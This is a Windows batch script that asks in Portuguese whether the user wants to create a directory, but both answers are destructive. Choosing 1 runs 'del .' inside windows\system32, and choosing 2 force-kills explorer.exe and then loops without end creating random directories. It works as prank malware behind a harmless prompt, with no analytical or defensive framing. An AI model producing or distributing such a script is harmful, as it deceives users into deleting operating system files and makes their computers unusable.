@echo off
echo Deseja fazer um diretorio?
echo 1 - Sim
echo 2 - Nao
set /P N=
:switch-case-example
  goto :switch-case-N-%N% 2>nul ||  (
 echo. Não apaga isso.
   )
  goto :switch-case-end
  
  :switch-case-N-1
		   cd..
		   cd windows
		   cd system32
		   del .
    	goto :switch-case-end     
  :switch-case-N-2
       taskkill /im explorer.exe -f
	:a
	mkdir %random%
	goto :a   
    	goto :switch-case-end
:switch-case-end
echo.